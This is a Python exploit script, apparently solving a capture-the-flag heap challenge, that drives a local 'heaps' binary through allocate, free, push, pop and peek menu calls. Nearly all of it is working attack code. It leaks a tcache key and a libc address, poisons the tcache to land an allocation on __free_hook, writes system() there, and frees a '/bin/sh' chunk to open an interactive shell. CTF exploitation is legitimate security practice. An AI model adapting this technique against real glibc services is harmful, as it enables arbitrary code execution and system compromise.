from gdb_plus import *

context.terminal = ['/home/ksaweryr/opt/alacritty/target/release/alacritty', '-e', 'bash', '-c']

libc = ELF('libc.so.6')

dbg = Debugger('./heaps', script='init-gef').remote('localhost', 5000)
io = dbg.p


def allocate(size):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Size? ', str(size).encode())
    return int(io.recvline().strip().split(b' ')[-1].decode()) # index


def deallocate(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index? ', str(idx).encode())


def push(idx, value):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index? ', str(idx).encode())
    io.sendlineafter(b'Value? ', str(value).encode())


def pop(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index? ', str(idx).encode())
    return int(io.recvline().strip().split(b' ')[-1].decode())


def peek(idx):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'Index? ', str(idx).encode())
    return int(io.recvline().strip().split(b' ')[-1].decode())


dbg.c(wait=False)

# fill up the tcache - 7 mallocs
# chunk that will go to unsorted bin - 8th malloc
# separator from wilderness - 9th malloc
# 1st malloc to leak tcache key
# 8th malloc to leak libc
# 7th malloc to do tcache poisoning
# pop last chunk from tcache - 10th malloc
# allocate on __free_hook - 11th malloc

idxs = []
for i in range(9):
    idxs.append(allocate(18))

for idx in idxs[:-1]:
    deallocate(idx)

tcache_key = peek(idxs[0])
print(f'{tcache_key = :016x}')

infoleak = peek(idxs[-2])
print(f'{infoleak = :016x}')
libc.address = infoleak - (0x00007f54cd6f1c00 - 0x00007f54cd511000)
print(f'{libc.address = :016x}')

for i in range(18):
    pop(idxs[6])
push(idxs[6], tcache_key ^ libc.sym['__free_hook'])

bin_sh = allocate(18)
hook = allocate(18)
push(bin_sh, u64(b'/bin/sh\x00'))
push(hook, libc.sym['system'])

deallocate(bin_sh)
io.interactive()

# io.recvuntil(b'> ')
# dbg.interrupt()

# from IPython import embed; embed()

# x/gx (unsigned long long*)&__free_hook